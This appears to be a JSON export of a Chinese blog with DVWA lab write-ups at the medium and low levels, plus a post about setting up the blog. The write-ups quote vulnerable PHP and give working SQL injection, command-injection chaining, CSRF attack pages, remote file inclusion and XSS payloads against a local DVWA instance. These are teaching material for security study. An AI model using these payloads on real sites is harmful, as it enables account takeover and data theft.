$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可以看到，服务器在第二步验证的时候，增加了对passed_captcha的检查，如果第一阶段的验证码通过了，那么passed_captcha就会变成true 本质上跟low级别没什么区别，只要在包中多加一个passed_captcha=true就好了 CSRF也一样，多加一条&lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt; 实际场景中，攻击者不可能知道这个多出来的参数是什么，所以第一步应该要先通过验证并且抓包，观察包中传了什么参数过去 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_POST[ &apos;id&apos; ]; // 转义sql语句中的特殊字符串 $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) { // 显示值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } ?&gt; 服务器先是使用mysql_real_escape_string函数将单引号以及双引号之类的特殊字符转义掉，再用下拉框来限制用户输入 下拉框很好解决，只要用bp抓包,直接在bp里面改就行 因为是数字型的注入，所以单引号基本用不着，只有在where语句上会用到单引号 将单引号以及单引号里面的内容全部转换成十六进制就可以绕过了，其他步骤同low SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_POST[ &apos;id&apos; ]; // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 反馈给用户 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } //mysql_close(); } ?&gt; 设置了下拉框限制用户输入，同时也消除了反斜杠之类的字符，但是对注入并没有什么影响 用bp抓包，在bp里改参数就行了 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; 将SessionID的值改为当前的时间 攻击者做的攻击流程跟low一样，只是多一步预估受害者进入系统的时间 XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { $default = $_GET[&apos;default&apos;]; //不永许脚本标记 if (stripos ($default, &quot;&lt;script&quot;) !== false) { header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 服务器端检查了输入的值是否为空，并且不允许出现script标签，出现了就把默认值改为english 只要在？default中间加一个#就可以绕过了，#后面的值不会传给服务器 或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件 ?default=English&gt;/option&gt;&lt;img src=1 onerror=alert(/xss/)&gt; XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 获取输入的值 $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; str_replace函数将输入的&lt;script&gt;删除 这个函数的绕过很简单，重写或者大小写替换都可以 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // 获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用&lt;b&gt;标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。 用bp抓包，在name里用重写或者大小写就可以绕过了","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"基于DVWA的web漏洞原理-low","slug":"dvwa-low","date":"2018-07-05T06:28:20.794Z","updated":"2018-07-13T11:17:24.026Z","comments":true,"path":"2018/07/05/dvwa-low/","link":"","permalink":"https://perfect.xyz/2018/07/05/dvwa-low/","excerpt":"php看的我眼睛都瞎了","text":"php看的我眼睛都瞎了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 获取用户名 $user = $_GET[ &apos;username&apos; ]; // 获取密码 $pass = $_GET[ &apos;password&apos; ]; //用md5加密 $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; //将结果保存到结果集中，如果错误，则输出一条错误信息并退出脚本 $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //判断结果集是否为1 if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取数据库中的用户信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 $html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 服务器对输入的username与password没有做限制，这就存在sql注入漏洞 关键点在于&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot; 这条语句 当用户输入的username的值为admin’ or ‘1’=’1时，整条语句就会变为&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;admin&#39; or &#39;1&#39;=&#39;1&#39; AND password = &#39;$pass&#39;;&quot;这条语句的逻辑为当user为admin或者当1=1时，整条语句为真 然而1=1永远为真，所以整条语句为真 语句返回一个true，即1，存到结果集中，这与输入正确的用户名和密码导致的结果是一样的 结果就是攻击者不需要知道admin的密码就登录了admin的账号 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; stristr（）函数在php中为忽略大小写 php_uname（）函数返回运行php系统有关的信息，参数s为返回系统的名称 原理也是过滤不严，没有对输入的值进行检查 直接在输入的ip地址后面加上&amp;、&amp;&amp;、|、||，加上自己想要执行的命令就行 拼接符号A &amp; B 简单的拼接，AB之间并无制约关系 A &amp;&amp; B A执行成功才会执行B A | B A的输出作为B的输入 A || B A执行失败才会执行B 常用命令ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; CSRF原理CSRF通过伪装来自受信任用户的请求来访问受信任的网站 1.当用户A访问了受信任的网站B 2.在打开B网页没有关闭的情况下又去访问了C 3.C利用A在B中未过期的cookie，发出一些请求代码来访问B 4.这样C就能在A不知情的情况下利用A的身份访问了B 而在上面的核心代码中，服务器收到请求后，只会检查两次输入的密码是否相同，没有任何防御CSRF的机制 利用方法构造urlhttp://localhost:8888/dvwa/vulnerabilities/csrf/password_new=password&amp;password_conf=password&amp;Change=Change#当受害者点击了这个url，他的密码就会被改成password 然而实际运用中，受害者点击这个url之后就会返回一个修改密码成功的界面，所以这个方法并不好用 构造攻击页面在自己的服务器上构造一个html页面 &lt;img src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf/?? password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 当受害者访问这个页面时，会以为访问了一个失效的url，但实际上密码已经被篡改 File Inclusion文件包含 核心代码： &lt;?php // 传入选择的参数 $file = $_GET[ &apos;page&apos; ]; ?&gt; 核心代码很简单，由用户选择文件，服务器去包含执行这些文件 服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 利用方法构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=phpinfo.php服务器会将phpinfo的内容显示在页面上 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件 在远程服务xx.xx.xx.xx上上传一个文件phpinfo.php 内容如下 &lt;?php phpinfo (); ?&gt; 构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=heep://xx.xx.xx.xx/phpinfo.php即可访问 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 上传的路径和文件名 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件是否能移动到新位置，用于检查文件是否上传成功 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能移动 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以移动 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; 对上传的文件没有任何的检查和过滤，只要上传php文件就可以获取服务器的webshell权限 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php //检查验证码是否正确 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏验证码窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos;], $_POST[&apos;g-recaptcha-response&apos;] ); // 检查输入的验证码是否正确 if( !$resp ) { // 输入的验证码错误 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 检查输入的两个新密码是否匹配 if( $pass_new == $pass_conf ) { // 两个密码匹配 $html .= &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 两个密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } //当验证码检查通过 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏验证窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 密码匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; reCAPTCHA验证流程客户端的请求验证码的模块先发送请求到google的服务器上 服务器返回验证码 用户发送验证码到网站的服务器 网站服务器将受到的验证码发给google服务器进行核对 绕过修改参数核心代码中，当step验证码通过时，会将step的值从1修改为2 因为中间没有做其他防护，攻击者要做的事很简单，只要用bp抓包，将step的值修改为2就好了 CSRF构造html &lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 受害者访问这个页面密码就会被改掉 SQL Injection Sourcesql注入 核心代码: &lt;?php if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_REQUEST[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集中的值 while( $row = mysqli_fetch_assoc( $result ) ) { $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 显示给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 原理同暴力破解，因为没有对输入的参数id进行过滤，攻击者可以通过修改id的值来更改sql查询语句，但是实际运用中攻击者是不知道服务器端的查询语句的，这就需要一个个猜了 手工注入的大致流程1.判断注入点可以用2-1、1=1之类的逻辑判断来寻找是否有注入点 2.查询表的列数利用order by来判断列数 Order by num来判断 1′ or 1=1 order by 2 3.联合查询知道列名之后开始联合查询 比如列数为2 Union select version(),database() 4.爆表名1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 5.爆列名1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ 6.爆数据1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_GET[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_GET[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors // 获取结果集中的值 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 没有找到用户，返回一个错误页面 header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; ); // 客户端返回的错误提示 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 盲注的原理跟注入是一样的，区别在于没有从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知 这个时候我们就要用到ascii(）和substr（）函数来一个个猜 如果页面会返回正确或者错误的信息，可以基于布尔盲注，由返回的页面来判断是否猜对 如果没有返回信息，只能用sleep（）基于时间盲注，由响应的时间来判断是否正确 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; //获取session id if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { //如果没有session id则将session id设为0 if (!isset ($_SESSION[&apos;last_session_id&apos;])) { $_SESSION[&apos;last_session_id&apos;] = 0; } //累加session id $_SESSION[&apos;last_session_id&apos;]++; $cookie_value = $_SESSION[&apos;last_session_id&apos;]; //向客户端发送一个http cookie setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; session id的原理密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。此时的认证，只需要知道是哪个用户在浏览当前的页面即可。 SessionID一旦在生命周期内被窃取，攻击者利用这个id就可以伪装成合法的用户访问服务器 利用方法由核心代码可知服务器的sessionid是从0开始累加的 当受害者获得sessionid之后，攻击者只要在自己的浏览器上将sessionid改为受害者的即可 按f12打开控制台，在控制台输入 读取：document.cookie; 修改：document.cookie[“Key”]=”值”; PS：我在自己的电脑上没有成功，可能是服务器设置的问题，两个浏览器获取到的sessionid是独立的 XSS(DOM)XSS漏洞原理xss漏洞的原理是将js代码恶意插入到网页中，当受害者访问页面时，恶意的代码就会在浏览器上执行 根据恶意的代码是否存储在服务器中，xss可以分为两种类型，一种是反射性xss，一种是存储型xss DOM型由于其特殊性，常被分为第三种,它是基于DOM文档对象模型的一种漏洞 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 绕过DOM型服务器端没有代码 只要在get获取到的参数后面加上js代码就行 http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 结果就是会出现一个弹框，内容为xss 修改xss里面的内容，改成各种函数，可以达到盗取服务器信息的目的 ps：在谷歌浏览器上做会失败，因为谷歌浏览器自带了防xss的机制，用火狐浏览器就可以做到了 XSS (Reflected)反射型xss 核心代码: &lt;?php //向客户端发送原始的 HTTP 报头 header (&quot;X-XSS-Protection: 0&quot;); // 检测get中是否有值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 反馈给用户 echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } 原理同DOM型XSS 在框里输入&lt;script&gt;alert(/xss/)&lt;/script&gt;出现弹框 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { //获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化输入的名称，同上 $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 存储型XSS因为是将js代码存在服务器上，每当有人访问了这个带有恶意代码的页面，xss就会被触发，所以传播的范围更广 直接在message栏中输入&lt;script&gt;alert(/xss/)&lt;/script&gt;也可以弹窗了在name行输入也行，但是name行有限制，可以通过抓包改包破除这个限制","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"搭博客过程中遇到的一些问题","slug":"problem","date":"2018-07-05T03:51:37.336Z","updated":"2018-07-13T11:12:03.026Z","comments":true,"path":"2018/07/05/problem/","link":"","permalink":"https://perfect.xyz/2018/07/05/problem/","excerpt":"求求你不要再404了.jpg","text":"求求你不要再404了.jpg 404搭建的过程中遇到过两次404的问题第一次是因为域名因为我的Github的用户名是a+qq号，最后出来的域名就很Low搭建的时候刚好在听perfect time这首歌，于是就决定作为我的项目名称建完之后访问perfect-time.github.io却怎么也访问不到一开始以为是没有绑定域名的缘故，花了3块钱在tx那里买了个xyz的域名，结果还是404最后重新建了一个项目，乖乖的填了自己的用户名才成功 第二次是发生在建完之后，hexo g -d之后突然又404了因为会出现404，所以连到Github的过程中没有问题能够本地运行，博客本身没有问题排查了半天之后发现是CNAME的缘故CNAM不能直接放在hexo目录下，要放到/source这个目录里面Github只会上传/source这个文件夹里面的更改，放在其他地方是没办法上传到服务器的上传不到服务器的结果就是Github域名解析不到博客的地址，但是在Dns这边是将博客地址转换成了域名地址，所以会出现404的情况总的来说就是一个粗心，本来一个下午就可以搞完的东西拖了两天才搞完 邮件联系方式中有邮件，想着以后说不定会有人发邮件给我，就把自己的邮件地址放了上去但是单单只放邮件地址会出现无事发生的情况网页的跳转肯定是以htpp协议封装的，邮件地址显然不认识http协议参考了学姐(大概)的博客，发现qq邮箱有一个邮我的功能，点开这个链接可以直接给我发邮件，这个功能很神奇尝试设置了一下之后发现根本跳转不到邮我的界面，肯定是链接出了什么问题这个问题还没解决 其他一些小问题版权声明在hexo目录下的_config文件中更改，就在最上面的Site和URL 文章摘要用&lt;!-- more --&gt;代码来实现，不用这个代码的话会把文章的内容全部显示在摘要里，而且不换行，特别难看 Markdown语法中，#后面必须跟着空格才能显示为标题，不然只会显示一个# 